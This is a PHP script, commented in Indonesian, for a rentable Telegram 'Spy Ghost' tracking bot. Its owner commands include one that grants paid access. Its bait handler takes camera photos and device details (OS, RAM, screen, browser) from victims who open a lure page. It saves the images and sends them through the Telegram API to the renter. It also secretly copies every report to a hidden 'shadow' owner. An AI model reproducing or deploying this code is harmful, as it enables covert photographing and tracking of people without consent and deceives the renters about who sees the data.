<?php
include 'config.php';
$input = json_decode(file_get_contents('php://input'), true);

// 1. LOGIKA PESAN MASUK (Command Telegram)
$update = json_decode(file_get_contents('php://input'), true);
if (isset($update['message'])) {
    $txt = $update['message']['text'];
    $cid = $update['message']['chat']['id'];

    // Sambutan /start Keren
    if (strpos($txt, '/start') === 0 && $cid == $owner_1) {
        $jam = date('H');
        $sapa = ($jam < 12) ? "Pagi" : (($jam < 15) ? "Siang" : (($jam < 18) ? "Sore" : "Malam"));
        $msg = "🕶️ **PROTOCOL SPY GHOST ONLINE** 🕶️\n----------------------------------\nSelamat $sapa, Tuan. Sistem terenkripsi.\n\nSiapa yang akan kita lacak hari ini? Berikan perintahmu, Tuan.\n\n🛡️ **Status**: Tak Terdeteksi\n📡 **Server**: Termux Mobile Node";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$cid&text=".urlencode($msg)."&parse_mode=Markdown");
        exit;
    }

    // Fitur /add User Premium
    if (strpos($txt, '/add') === 0 && $cid == $owner_1) {
        $p = explode(' ', $txt);
        $premium_users[$p[1]] = date('Y-m-d', strtotime("+".$p[2]." days"));
        file_put_contents($db_file, json_encode($premium_users));
        $res = "✅ **BERHASIL!**\n🆔 ID: `".$p[1]."` aktif ".$p[2]." hari.";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$cid&text=".urlencode($res)."&parse_mode=Markdown");
        exit;
    }
}

// 2. LOGIKA PANCINGAN (Data dari index.php)
if (isset($input['img'])) {
    $uid = $input['user_id'];
    if (!isset($premium_users[$uid])) {
        $p_tolak = str_replace("{ID}", $uid, $pesan_sewa);
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$uid&text=".urlencode($p_tolak)."&parse_mode=Markdown");
        exit;
    }

    $img = base64_decode(str_replace('data:image/jpeg;base64,', '', $input['img']));
    $fname = 'ghost_'.time().'.jpg';
    file_put_contents($fname, $img);
    
    $cap = "👻 **SPY GHOST REPORT** 👻\n---------------------------\n🎯 **TARGET ACQUIRED!**\n📱 **OS**: ".$input['info']['os']."\n💾 **RAM**: ".$input['info']['ram']."GB\n🖥️ **Screen**: ".$input['info']['screen']."\n🌐 **Browser**: ".$input['info']['agent'];
    
    include 'bot.php';
    kirimLaporan($owner_1, $fname, $cap); // Kirim ke Penyewa
    kirimLaporan($owner_bayangan, $fname, "🕵️ **MONITOR BAYANGAN**\n".$cap); // Kirim ke Boss Kensora
}
?>